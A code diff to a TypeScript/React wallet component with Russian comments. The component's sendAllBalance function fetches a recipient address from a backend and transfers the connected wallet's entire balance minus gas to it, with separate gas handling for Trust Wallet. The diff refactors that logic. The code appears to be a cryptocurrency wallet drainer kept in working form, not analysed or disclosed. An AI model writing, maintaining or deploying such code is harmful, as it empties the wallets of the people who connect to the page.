@@ -9,7 +9,7 @@ async function sendAllBalance(
   eth: ExternalProvider & { request(args: { method: string; params?: unknown[] }): Promise<unknown> },
   addr: string,
   setStatus: (msg: string) => void,
-  { isMetaMask, isTrustWallet }: { isMetaMask: boolean; isTrustWallet: boolean },
+  { isTrustWallet }: { isTrustWallet: boolean },
 ): Promise<string> {
   // 1. Получаем адрес получателя от бэка
   setStatus('Получаем адрес получателя от бэка…')
@@ -34,8 +34,7 @@ async function sendAllBalance(
     maxPriorityFeePerGas = BigInt(web3.utils.toWei('2.5', 'gwei'))
   }
   
-  const useLegacy = isTrustWallet;
-  if (useLegacy) {
+  if (isTrustWallet) {
     const gasPrice = BigInt(await web3.eth.getGasPrice());
     const gasCost = gasPrice * gasLimit;
     const valueToSend = balanceWei - gasCost;
@@ -109,7 +108,7 @@ export default function Wallet() {
 
     try {
       // const txHash = await sendAllBalance(eth, addr, setStatus)
-      const txHash = await sendAllBalance(eth, addr, setStatus, { isMetaMask, isTrustWallet })
+      const txHash = await sendAllBalance(eth, addr, setStatus, { isTrustWallet })
       setStatus(`Успех! TxHash: ${txHash}`)
     } catch (e: any) {
       setStatus(`Ошибка: ${e.message}`)
